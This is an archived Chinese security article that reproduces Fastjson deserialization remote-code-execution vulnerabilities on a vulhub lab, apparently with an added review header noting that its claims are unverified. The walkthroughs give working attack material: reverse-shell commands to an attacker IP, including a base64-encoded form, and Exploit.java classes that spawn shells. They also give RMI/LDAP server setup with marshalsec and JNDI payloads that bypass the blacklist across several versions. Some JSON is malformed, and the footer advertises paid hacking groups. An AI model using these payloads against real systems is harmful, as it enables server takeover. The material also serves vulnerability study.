---
version: "{'@type':'org.apache.shiro.jndi.JndiObjectFactory','resourceName':'ldap://ip:138"
source: "MrWQ/vulnerability-paper"
product: "Fastjson JNDI/cache bypass"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "漏洞复现 Fastjson 系列"
prerequisites: "来源所述条件，未列明部分仍待核：Lab1.2.47; list<=24/41/42/43/45/47/62/66; later headings use< not<=; runtime/third-party gadget prerequisites incomplete"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/5ebWECpbpX3-c7PEml2NVA"
id: "vw-8c3823a437a3f2edcb15f7c0"
entity_id: "ve-8c3823a437a3f2edcb15f7c0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Lab1.2.47; list&lt;=24/41/42/43/45/47/62/66; later headings use&lt; not&lt;=; runtime/third-party gadget prerequisites incomplete

代码与实验材料：Two RMI tooling workflows and Java class examples; first mixes generated-tool and manual class flow; claim deleting class allows repeat ignores target classloader cache

来源证据范围：Original WeChat, official marshalsec/wyzxxz repos, no primary fixes

- **事实待核（1）**：InetAddress DNS response presented as vulnerability proof rather than parser behavior; primary version metadata unusable。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **代码与转录边界（2）**：Affected boundary contradictions and absent AutoType/dependency requirements in older sections; malformed/collapsed JSON。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **来源与引用处置（3）**：Commercial/footer bulk, no remediation, repeated setup。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 【漏洞复现】Fastjson 系列

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5ebWECpbpX3-c7PEml2NVA)

现在只对常读和星标的公众号才展示大图推送，建议大家能把**渗透安全团队** “**设为星标**”，否则可能就看不到了啦！
------------------------------------------------------------

一、Fastjson 概述
=============

Fastjson 是阿里巴巴公司开源的一款 json 解析器，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。

二、历史漏洞
======

```
Fastjson <=1.2.24反序列化远程命令执行漏洞
Fastjson <=1.2.41反序列化远程命令执行漏洞
Fastjson <=1.2.42反序列化远程命令执行漏洞
Fastjson <=1.2.43反序列化远程命令执行漏洞
Fastjson <=1.2.45反序列化远程命令执行漏洞
Fastjson <=1.2.47反序列化远程命令执行漏洞
Fastjson <=1.2.62反序列化远程命令执行漏洞
Fastjson <=1.2.66反序列化远程命令执行漏洞

```

三、漏洞介绍
======

fastjson 在解析 json 的过程中，支持使用 auto Type 来实例化某个具体的类，并调用该类的 set/get 方法来访问属性，通过查找代码中相关的方法，即可构造出一些恶意利用链。

fastjson 于 1.2.24 版本后增加了反序列化的白名单，而在 1.2.48 以前的版本中，攻击者可以利用特殊构造的 json 字符串绕过白名单检测，成功执行任意命令。

四、Fastjson 特征识别
===============

1、第一种识别方法 - json 格式包
--------------------

json 学习链接：https://www.runoob.com/json/json-tutorial.html

```
{
    "sites": [
    { "name":"菜鸟教程" , "url":"www.runoob.com" }, 
    { "name":"google" , "url":"www.google.com" }, 
    { "name":"微博" , "url":"www.weibo.com" }
    ]
}

```

Fastjson 的作用是用于对 JSON 格式的数据进行解析和打包，所以出现 json 格式的地方就有可能使用了 Fastjson。

![](../../.resource/remote/f1116c7dc45abf986ae09796137a16f8071d7dd48ed38dad95afb5dee9bfae11.png)

2、第二种识别方法 - 报错处理
----------------

1、我们抓到包以后，首先将包改为 POST。

![](../../.resource/remote/6fb862a3c832954b1d812d6e5635d6ca83438933410af31c9accf5558046c3f3.png)

2、这时候，我们需要改两处字段。

![](../../.resource/remote/362db09d7d3cbfc363c0725e645d4b4b7b54a4f12e91496bee217cef7dc742f9.png)

*   `Content-Type: application/xxxx`原本的字段改为`Content-Type: application/json`
    
*   后面空一格，加上。
    

```
{
   "name":"1"
}

```

3、然后，我们删除 json 格式包的一半，使其报错。

```
{
   "name":"1

```

![](../../.resource/remote/0cea6b70192f09ac5e1283dd3745c6c06a6c98cbb8ef42ecac3bfd3dca766fbd.png)

报错之后，很明显响应包里面出现了 alibaba.fastjson 的错误信息。

3、第三种识别方式 - DNSlog
------------------

1、java.net.InetAddress 这个类在实例化时会尝试作对 example.com 做域名解析，这时候可以通过 dnslog 的方式得知漏洞是否存在。

2、获取 dnslog 地址：http://dnslog.cn/

![](../../.resource/remote/664241b3cc7e9c70ce6df7fbd2b214274a547eb5dc8402cc9ef5e35ead4739dc.png)

3、将地址复制到 json 包相应的位置。

```
{
    "name":{
        "@type":"java.net.InetAddress",
        "val":"i1q73g.dnslog.cn"
    }
}

```

![](../../.resource/remote/9e372cc5f1865eed99a2d8d48098028a21f6dab602656d7d1a6f263de5c4c99c.png)

进行发包。

4、DNSlog 顺利回显。

![](../../.resource/remote/f67a713a179313cdbc0fd6a0c00392f74600ea9c32a41f60e5148d197c91d6ea.png)

五、Fastjson1.2.47 命令执行漏洞复现
=========================

1、JNDI
------

1、JNDI(The Java Naming and Directory Interface，Java 命名和目录接口) 是一组在 Java 应用中访问命名和目录服务的 API，命名服务将名称和对象联系起来，使得我们可以用名称访问对象。

可以访问以下名称 / 目录服务：

```
RMI（Java远程方法调用）
LDAP（轻量级目录访问协议）
CORBA（公共对象请求代理体系结构）
DNS（域名服务）

```

2、JNDI 注入 + RMI
---------------

1、RMI 是 Java 远程方法调用，是 Java 编程语言里，一种用于实现远程过程调用的应用程序编程接口，它使客户机运行的程序可以调用远程服务器的对象。

3、环境搭建
------

1、这里我们使用的是 vulhub 靶场。

```
cd 1.2.47-rce/
docker-compose up -d
docker-compose config

```

![](../../.resource/remote/52b20011d7eb7665eae85660ab82601c7fb9ca93c3dc57b7435a2baa9b1ffc55.png)

2、接着我们访问漏洞页面：http://192.168.111.133:8090/

![](../../.resource/remote/6569c126e586f9c336f0dc285d9871d9501dc24ca9ec90ab931905f4ce0c24b7.png)

环境启动成功。

4、第一种复现
-------

1、靶机 IP：192.168.111.133

    攻击机 IP：192.168.111.129

2、下载利用工具。

下载链接：git clone https://github.com/wyzxxz/fastjson_rce_tool.git

3、利用工具启动 RMI server

```
java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.111.129 9999 "要执行的命令"
java -cp fastjson_tool.jar fastjson.HRMIServer 攻击机IP 端口随意 "要执行的命令"

```

如果是反弹 shell 的命令，需要将其进行编码，管道符，输入输出重定向，只有在 bash 环境下才能用，而在这里，我们使用的是 java 为我们提供的命令执行环境，不支持管道符，输入输出重定向等，因此需要 base64 编码一下。

4、反弹 shell 命令。

```
bash -i >& /dev/tcp/192.168.111.129/6666 0>&1

```

我们进行 base64 编码：http://www.jsons.cn/base64/

![](../../.resource/remote/eeb0bde522739a3081db5f40dfc9c746a4b0392df706331e2d733fefee6d4365.png)

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xMjkvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}

```

5、然后放入 payload 中执行。

```
java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.111.129 9999 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xMjkvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}"

```

![](../../.resource/remote/455eadbce3bfca3206c61720183e1bb5c865ccd5a0b285dfecb829b9280ca561.png)

利用 JNDI 注入加载远程 RMI server 上的字节码。

6、生成字节码文件步骤如下：

Exploit.java

```
//javac Exploit.java
import java.lang.Runtime;
import java.lang.Process;
public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.111.129/6666 0>&1");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}

```

7、对 Exploit.java 文件进行编译。

javac Exploit.java

![](../../.resource/remote/420bea61677a59349c0b098082bcabd25ecacb651f602ce0436fe725d8a93279.png)

8、我们在攻击机开启监听。

nc -lvvp 6666

![](../../.resource/remote/54648694ae51c079bda67e9baa7526360aeb43dd564067ddb97b48d8bf418779.png)

9、我们在 Burp 中复制 payload，进行发包。

```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.111.129:9999/Object",
        "autoCommit":true
    }
}

```

![](../../.resource/remote/4c810e0fe2bceb11e6e339f59288a3528bc385d4625698fea37aa36c084671ae.png)

10、成功得到 shell。

![](../../.resource/remote/bedb02541f0ed1ca661541d3244eecd02e69122347bc86a31dceff6b872df1be.png)

注意，重新获得 shell 的话，需要删除. class 文件，重新生成。

5、第二种复现
-------

1、工具下载：https://github.com/mbechler/marshalsec

2、借助 marshalsec 项目启动一个 rmi 服务器，监听一个端口，并指定加载远程类 Exploit.class。

maven 打包项目成 jar 包：

mvn clean package -DskipTests

2、攻击机开启 RMI Server。  

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.111.129:8000/#Exploit" 9999

```

3、编写漏洞利用脚本 Exploit.java。  

```
//javac Exploit.java
public class Exploit{
    public Exploit(){
        try{
            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/192.168.111.129/2333 0>&1");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}

```

![](../../.resource/remote/c7238493aff1cd62b0b287a4de610c113bd7bc60e58fddf6699cb00845e0c42e.png)

4、在攻击机开启 8000 端口的 HTTP 服务，在 Exploit.class 所在目录执行。

```
[python2]python2 -m SimpleHTTPServer
[python3]python3 -m http.server

```

5、攻击机开启 2333 端口监听，等待靶机将 shell 送上来。

nc -lvvp 2333

![](../../.resource/remote/91c78866ec408a2dba99b78bc0d23afb4874324853b1f0559a939ce6ffd78b17.png)

6、Burp 攻击靶机。

```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.111.129:9999/Exploit",
        "autoCommit":true
    }
}

```

![](../../.resource/remote/5612170b8d0abd8589fba5da4d287c77ea4de0ea9a03934445c28b21a2d44f81.png)

7、得到 shell。

![](../../.resource/remote/4e3741b6a7032599a0b618c22af6be7019f45ad929afba4d23fa80c8f2e15dc8.png)

六、Fastjson 历史漏洞
===============

1、Fastjson < 1.2.41
-------------------

第一个 Fastjson 反序列化漏洞爆出以后，阿里在 1.2.25 版本设置了`autoTypeSupport`属性默认为 false，并且增加了 checkAutoType() 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的。

`com.sun.rowset.jdbcRowSetlmpl`在 1.2.25 版本被加入了黑名单，fastjson 有个判断条件判断类名是否以 "L" 开头，以 ";" 结尾，是的话就提取出其中的类名在加载进来。

那么就可以构造如下 exp：  

```
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;", "dataSourceName":"rmi://ip:9999/rce_1_2_24_exploit", "autoCommit":true

```

2、Fastjson < 1.2.42
-------------------

阿里在发现这个绕过漏洞之后做出了类名如果为 L 开头，; 结尾的时候就先去掉 L 和; 进行黑名单验证的方法，但是没有考虑到双写或者多写的情况，也就是说这种方法只能防御一组 L 和;，构造 exp 如下，即双写 L 和;  

```
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://x.x.x.x:9999/exp", "autoCommit":true}

```

3、Fastjson < 1.2.47
-------------------

在 1.2.47 版本及以下的情况下，loadClass 默认 cache 为 true，首先使用`java.lang.Class`把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了`com.sun.rowset.jdbcRowSetlmpl`这个类，即可绕过黑名单。  

```
{ "a": { "@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl" }, "b": { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "rmi://ip:9999/exp", "autoCommit": true \}\}

```

4、Fastjson < 1.2.66
-------------------

基于黑名单绕过，autoTypeSupport 属性 true 才能使用，在 1.2.25 版本之后，autoTypeSupport 默认为 false。

```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://ip:1389/Calc"}{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://ip:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://ip:1389/Calc"}

```

**★  
**

**付费圈子  
**

  

  

**欢 迎 加 入 星 球 ！**

**代码审计 + 免杀 + 渗透学习资源 + 各种资料文档 + 各种工具 + 付费会员**

![](../../.resource/remote/2283725dd954602e2683caaaf09cf31e1b5878cfb352086e4738684c3f29897a.gif)

  

****进成员内部群****

![](../../.resource/remote/be2ed8331c8a8e32cf6f94eb8eec4347c1a7766c1a216de986393decb700949d.jpg)

  

  

![](../../.resource/remote/2283725dd954602e2683caaaf09cf31e1b5878cfb352086e4738684c3f29897a.gif)

  

****星球的最近主题和星球内部工具一些展示****

![](../../.resource/remote/048311efc7c3f5066cad0735b139380349070777da99616c545a11e9c651af29.jpg)

![](../../.resource/remote/4ad00afd34a98232ef71fbc56b2cd0449059273ab90090a6d5a71cd24b4f6431.png)

![](../../.resource/remote/95543657e829477600aefe472073fafc65087bca566bd057e8e5924c13db0c58.png)

![](../../.resource/remote/86b5152d70f5536e02d261583590839470299368dd7e038410a253fb451272ec.png)

![](../../.resource/remote/7a090c597f4d6f43e761ca60d030335198fedfb5ac6732a2012abf133f31093a.png)

![](../../.resource/remote/19ed9fa93f2b291fabed8b6ebd450ff76daf3295795bae99985a06f859672c41.png)

![](../../.resource/remote/409293bfbde23a54f46909b8ffa617615c00ef1e01d70782d19255700984f2d9.png)

![](../../.resource/remote/bf37db915d0d89cff537aba1409194ae11d9dc592a6d4cf59a6ebcf6acedf059.png)

**![](../../.resource/remote/e1985a2642c623c87d6e99ec020b350a06207892a1d238a211119ddfd45eb150.png)**

**关 注 有 礼**

  

  

关注下方公众号回复 “666” 可以领取一套领取黑客成长秘籍

![](../../.resource/remote/308b930b5d78a66f7a0c9ebe56905812674f1f404cfa60e9c0e3c37367629f73.png) 还在等什么？赶紧点击下方名片关注学习吧！![](../../.resource/remote/308b930b5d78a66f7a0c9ebe56905812674f1f404cfa60e9c0e3c37367629f73.png)

![](../../.resource/remote/40aaad22af7f44171fc001f77fa3df3da580afe10e64b4cc679d75fa1c5f4216.png)  

**推荐阅读**

[**************群聊 | 技术交流群 - 群除我佬**************](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)

[****干货｜史上最全一句话木马****](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)

[**干货 | CS 绕过 vultr 特征检测修改算法**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  

[**实战 | 用中国人写的红队服务器搞一次内网穿透练习**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  

[**实战 | 渗透某培训平台经历**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  

[**实战 | 一次曲折的钓鱼溯源反制**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)

**免责声明**

由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

好文分享收藏赞一下最美点在看哦

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
